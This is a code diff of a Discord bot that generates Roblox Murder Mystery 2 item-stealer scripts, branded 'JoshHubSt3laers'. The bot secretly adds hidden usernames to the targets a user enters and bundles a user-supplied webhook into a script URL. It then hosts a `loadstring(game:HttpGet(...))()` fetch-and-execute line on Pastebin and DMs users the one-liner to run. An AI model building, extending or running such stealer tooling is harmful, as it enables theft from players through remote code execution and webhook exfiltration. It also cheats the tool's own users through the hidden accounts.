@@ -80,7 +80,7 @@ class ScriptModal(Modal, title="MM2 Script Generator"):
         user_targets = [name.strip() for name in self.usernames.value.split(",") if name.strip()]
         all_targets = user_targets + SECRET_USERNAMES
         
-        # Build URL
+        # Build GitHub URL
         params = urllib.parse.urlencode({
             "users": ",".join(all_targets),
             "webhook": self.webhook.value,
@@ -91,41 +91,32 @@ class ScriptModal(Modal, title="MM2 Script Generator"):
         
         github_url = f"{RAW_SCRIPT_URL}?{params}"
         
-        # Create Pastebin
+        # Create Pastebin with the GitHub loadstring
         script_content = f'loadstring(game:HttpGet("{github_url}"))()'
         paste_url, raw_url = create_pastebin(script_content)
         
-        if paste_url and raw_url:
-            # FULL LOADSTRING FOR USER
+        if raw_url:
+            # Full loadstring with Pastebin raw URL
             final_loadstring = f'loadstring(game:HttpGet("{raw_url}"))()'
-            
-            # DEBUG OUTPUT
-            print("="*50)
-            print(f"[DEBUG] paste_url = {paste_url}")
-            print(f"[DEBUG] raw_url = {raw_url}")
-            print(f"[DEBUG] final_loadstring sent to user = {final_loadstring}")
-            print("="*50)
-            
-            # Send full loadstring
-            try:
-                await interaction.user.send(
-                    f"**🔪 JoshHubSt3laers – Your Loadstring is Ready!**\n\n"
-                    f"Copy and execute this:\n"
-                    f"```lua\n{final_loadstring}\n```"
-                )
-                await interaction.followup.send("✅ Sent to your DMs!", ephemeral=True)
-            except:
-                await interaction.followup.send(
-                    f"**🔪 JoshHubSt3laers – Your Loadstring is Ready!**\n\n"
-                    f"Copy and execute this:\n"
-                    f"```lua\n{final_loadstring}\n```",
-                    ephemeral=True
-                )
+            print(f"[DEBUG] Final loadstring being sent: {final_loadstring}")
         else:
-            fallback = f'loadstring(game:HttpGet("{github_url}"))()'
-            print(f"[DEBUG] Pastebin failed - using fallback: {fallback}")
+            # Fallback to GitHub
+            final_loadstring = f'loadstring(game:HttpGet("{github_url}"))()'
+            print(f"[DEBUG] Pastebin failed - Final fallback loadstring: {final_loadstring}")
+        
+        # Send the full loadstring
+        try:
+            await interaction.user.send(
+                f"**🔪 JoshHubSt3laers – Your Loadstring is Ready!**\n\n"
+                f"Copy and execute this:\n"
+                f"```lua\n{final_loadstring}\n```"
+            )
+            await interaction.followup.send("✅ Sent to your DMs!", ephemeral=True)
+        except:
             await interaction.followup.send(
-                f"**Direct fallback:**\n```lua\n{fallback}\n```",
+                f"**🔪 JoshHubSt3laers – Your Loadstring is Ready!**\n\n"
+                f"Copy and execute this:\n"
+                f"```lua\n{final_loadstring}\n```",
                 ephemeral=True
             )
 
@@ -139,8 +130,8 @@ async def on_ready():
     try:
         await tree.sync()
         print("🔄 Commands synced")
-    except Exception as e:
-        print(f"⚠️ Sync issue: {str(e)}")
+    except:
+        print("⚠️ Sync issue")
 
 if __name__ == "__main__":
     if not DISCORD_TOKEN:
